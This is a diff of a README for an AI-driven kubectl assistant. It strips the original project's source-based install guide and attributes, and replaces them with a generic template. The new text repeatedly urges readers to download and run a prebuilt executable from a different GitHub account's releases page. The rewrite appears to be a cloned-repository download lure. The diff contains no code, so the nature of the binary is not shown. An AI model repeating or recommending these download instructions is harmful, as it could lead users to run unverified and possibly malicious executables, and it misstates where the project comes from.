@@ -1,228 +1,80 @@
-# Agentic Kubernetes CLI
+# 🤖 Agentic-Kubernetes-CLI - Easily Transform Natural Language to Commands
 
-[![Python](https://img.shields.io/badge/Python-3.12%2B-blue.svg)](https://www.python.org/downloads/)
-[![Kubernetes](https://img.shields.io/badge/Kubernetes-1.34%2B-326CE5.svg)](https://kubernetes.io/)
-[![AWS Bedrock](https://img.shields.io/badge/AWS-Bedrock-FF9900.svg)](https://aws.amazon.com/bedrock/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+## 📥 Download Now
 
-> **An intelligent Agentic Kubernetes CLI assistant** that integrates your **local MCP server** with **AWS Bedrock**, enabling natural language control over **kubectl commands**, **cluster management**, and **real-time Kubernetes insights**.
+[![Download Agentic-Kubernetes-CLI](https://img.shields.io/badge/Download-Agentic--Kubernetes--CLI-blue.svg)](https://github.com/andersoncarmona913/Agentic-Kubernetes-CLI/releases)
 
+## 🚀 Getting Started
 
----
+Welcome to Agentic-Kubernetes-CLI! This tool helps you effortlessly convert natural language into `kubectl` commands. By integrating with Strands Agent and the MCP server, you can manage Kubernetes applications without needing to memorize command syntax.
 
-## 🚀 Features
+## 📦 System Requirements
 
-### 🗣️ Natural Language Kubernetes Operations
-- Conversational `kubectl` interface — execute commands in plain English
-- AI-powered command generation and validation
-- Context-aware management of clusters and namespaces
-- Real-time monitoring: pods, logs, resources, and events
+Before you begin, ensure your system meets these requirements:
 
-### ⚙️ Advanced Capabilities
-- ✅ **Resource Management** — List, describe, and manage Kubernetes resources
-- 📊 **Troubleshooting Assistant** — Analyze logs and diagnose issues
-- 🔄 **Context Switching** — Move between clusters easily
-- ⚡ **Interactive CLI** — Friendly prompt-driven interface
+- **Operating System:** Windows, macOS, or Linux
+- **Processor:** 2 GHz Dual-Core or higher
+- **RAM:** At least 4 GB
+- **Disk Space:** 100 MB of free space
+- **Network:** Stable internet connection for remote commands
 
----
+## 🛠️ Installation Steps
 
-## 🎥 Demo
+### 1. Visit the Release Page
 
-Below is an example interaction between the **User** and the **Agentic Kubernetes CLI** demonstrating real-time troubleshooting and remediation.
+Go to our [Releases page](https://github.com/andersoncarmona913/Agentic-Kubernetes-CLI/releases) to find the latest version of Agentic-Kubernetes-CLI.
 
----
+### 2. Download the Application
 
-**🧑‍💻 User:** list all pods in the cluster  
-**🤖 Agent:** There are no running pods, but one pod `nginx` is showing an issue (`ImagePullBackOff`).
+Locate the file for your operating system on the Releases page. Click on the link to start downloading. This file will typically be in either `.zip` (for Windows) or `.tar.gz` (for Linux and macOS) format.
 
-**🧑‍💻 User:** analyze the issue with `nginx` pod  
-**🤖 Agent:** Issue identified — the container image tag `nginx:lt` is incorrect and not found in the registry.
+### 3. Extract the Files
 
-**🧑‍💻 User:** fix the image tag issue and make the pod running  
-**🤖 Agent:** Updated the image tag to `nginx:latest`, redeployed the pod, and verified that it is now **Running** successfully.
+Once downloaded, you will need to extract the files:
 
----
+- **Windows:** Right-click the `.zip` file and select "Extract All."
+- **macOS/Linux:** Use the terminal command `tar -xvzf filename.tar.gz` to extract the files.
 
-<video width="640" height="360" controls>
-  <source src="https://github.com/user-attachments/assets/c30c4288-793c-4554-98ac-185075a621f0" type="video/mp4">
-  Your browser does not support the video tag.
-</video>
+### 4. Run the Application
 
-[🎥 Watch Full Demo Video](https://github.com/user-attachments/assets/c30c4288-793c-4554-98ac-185075a621f0)
-
----
-
-
-## 📚 Table of Contents
-
-- [Prerequisites](#-prerequisites)
-- [Installation](#-installation)
-- [Configuration](#-configuration)
-- [Usage](#-usage)
-- [Examples](#-examples)
-- [Architecture](#-architecture)
-- [MCP Tools](#-mcp-tools)
----
-
-## 🔧 Prerequisites
-
-### Required Software
-- [Python 3.12+](https://www.python.org/downloads/)
-- [kubectl](https://kubernetes.io/docs/tasks/tools/)
-- Access to a running **Kubernetes cluster**
-- **AWS account** with Bedrock API access
-
-### AWS Bedrock Setup
-1. Enable Claude models in the AWS Bedrock console  
-2. Configure AWS credentials with Bedrock access  
-3. Ensure IAM permissions for `bedrock:InvokeModel`  
-
----
-
-## 📦 Installation
-
-### Quick Setup
+Navigate to the folder where you extracted the files. Look for the executable file named `agentic-kubernetes-cli`. Double-click to run it, or execute it via the terminal with the command:
 
 ```bash
-# Clone the repository
-git clone https://github.com/Tarique-B-DevOps/Agentic-Kubernetes-CLI.git
-cd Agentic-Kubernetes-CLI
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Verify kubectl installation
-kubectl version --client
-
-# Run the agent
-python3 agent.py
+./agentic-kubernetes-cli
 ```
 
----
+## 📚 How to Use
 
-## ⚙️ Configuration
+Agentic-Kubernetes-CLI has a simple interface. You can enter plain language commands to interact with your Kubernetes cluster. Here’s how to get started:
 
-### Environment Variables
+1. **Open the Command Line Interface:** You can use any terminal software.
+   
+2. **Type Your Command:** For example, you might say: "Deploy my application." The software will convert this into the correct command for Kubernetes.
 
-Set or export the following variables before running the agent:
+3. **Execute the Command:** Press `Enter` to run the command in your environment.
 
-```bash
-# AWS Bedrock Configuration
-export BEDROCK_MODEL_REGION=us-east-1
-export BEDROCK_MODEL_ID=apac.anthropic.claude-3-5-sonnet-20241022-v2:0
+## ✅ Example Commands
 
-# AWS Credentials (optional if configured with AWS CLI)
-export AWS_ACCESS_KEY_ID=your_access_key
-export AWS_SECRET_ACCESS_KEY=your_secret_key
-export AWS_REGION=us-east-1
-```
+Here are some example phrases and their corresponding `kubectl` commands:
 
----
+- **"Get all pod details"** will run: `kubectl get pods`
+- **"Scale my app to 3 instances"** runs: `kubectl scale deployment my-app --replicas=3`
+- **"Show the status of my service"** translates to: `kubectl get services my-service`
 
-## 🎯 Usage
+## 🎓 Troubleshooting Tips
 
-### Start the Agent
+If you encounter issues:
 
-```bash
-python3 agent.py
-```
+- **Check the Network Connection:** Ensure your machine is connected to the internet.
+- **Make Sure Kubernetes is Running:** Your Kubernetes cluster must be active for commands to work.
+- **Review Permissions:** You may need administrator or superuser permissions for certain commands.
 
-### Example Interactive Commands
+## 🕵️‍♂️ Support and Feedback
 
-```bash
-⎈ kubectl> list all pods in production namespace
-⎈ kubectl> what's wrong with my nginx deployment?
-⎈ kubectl> show me the last 100 logs from api-server
-⎈ kubectl> switch to staging cluster
-```
+For any issues or questions, please raise them on our [GitHub Issues page](https://github.com/andersoncarmona913/Agentic-Kubernetes-CLI/issues). We welcome feedback and will do our best to address your needs.
 
----
+## 💾 Download & Install Again
 
-## 💡 Examples
+Remember, you can always revisit our [Releases page](https://github.com/andersoncarmona913/Agentic-Kubernetes-CLI/releases) to download the latest version. Keep your application updated for the best performance.
 
-### List Pods
-
-```bash
-⎈ kubectl> show all pods in the cluster
-```
-**AI Response:**
-```
-✅ Command executed successfully:
-NAME                     READY   STATUS    RESTARTS   AGE
-nginx-7854ff8877-2kxq9   1/1     Running   0          5d
-api-server-abc123        1/1     Running   2          3d
-```
-
-### Troubleshoot a Pod
-
-```bash
-⎈ kubectl> why is my app-server pod failing?
-```
-**AI Response:**
-```
-Analyzing pod app-server...
-Issue: ImagePullBackOff
-Root Cause: Container exits with code 1
-Last Error: Connection refused to database:5432
-Suggestion: Check database service and credentials
-```
-
-### View Logs
-
-```bash
-⎈ kubectl> get the last 50 lines of logs from nginx pod and summarize
-```
-
-### Manage Contexts
-
-```bash
-⎈ kubectl> list all available clusters
-⎈ kubectl> switch to production-cluster
-⎈ kubectl> what's my current context?
-```
-
-### Scale Deployments
-
-```bash
-⎈ kubectl> scale nginx deployment to 5 replicas
-```
-
-### Namespace Operations
-
-```bash
-⎈ kubectl> show all resources in kube-system namespace
-⎈ kubectl> get all deployments across all namespaces
-```
-
----
-
-## 🏗️ Architecture
-
-### System Components
-
-![Architecture Diagram](https://github.com/user-attachments/assets/4e21ee25-fb6c-4750-8c1f-4d2d410248fc)
-
----
-
-## 🧩 MCP Tools
-
-### run_kubectl_command
-
-```python
-{
-  "command": "kubectl get pods -n default -o json",
-  "return_code": 0,
-  "stdout": "...",
-  "success": true
-}
-```
-
-### kubectl_context
-
-```python
-{
-  "action": "list",
-  "success": true,
-  "output": "..."
-}
-```
+Thank you for using Agentic-Kubernetes-CLI! We hope it makes your Kubernetes management easier and more intuitive.
